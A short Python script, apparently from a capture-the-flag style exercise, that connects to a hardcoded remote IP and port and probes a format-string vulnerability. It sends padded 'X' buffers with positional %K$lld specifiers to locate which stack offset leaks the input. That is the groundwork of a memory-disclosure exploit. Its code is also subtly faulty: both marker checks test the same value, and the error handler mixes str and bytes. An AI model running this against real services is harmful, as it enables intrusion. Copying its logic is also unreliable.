#!/usr/bin/env python3
import socket, time, re
HOST="144.79.188.39"; PORT=43642
s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300)
def ask(fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.1)
    try: return s.recv(4096)
    except Exception as e: return ('<T>'+str(e).encode())
# format: 16 X's (buffer[0:8]=X, buffer[8:16]=X) + %K$lld. Find which K reads buffer[8:16]=0x58...*8
VAL = 0x5858585858585858
for K in range(5, 16):
    d=ask(b"X"*16 + b"%%%d$lld" % K)
    m=re.search(rb'([0-9-]+)\n', d)
    if m:
        v=int(m.group(1))
        mark = " <== buffer[8:16]" if (v & ((1<<64)-1))==VAL else (" <== buffer[0:8]" if (v&((1<<64)-1))==0x5858585858585858 else "")
        print(f"K={K}: {hex(v&((1<<64)-1))}{mark}")
    else:
        print(f"K={K}: {repr(d)}")
s.close()
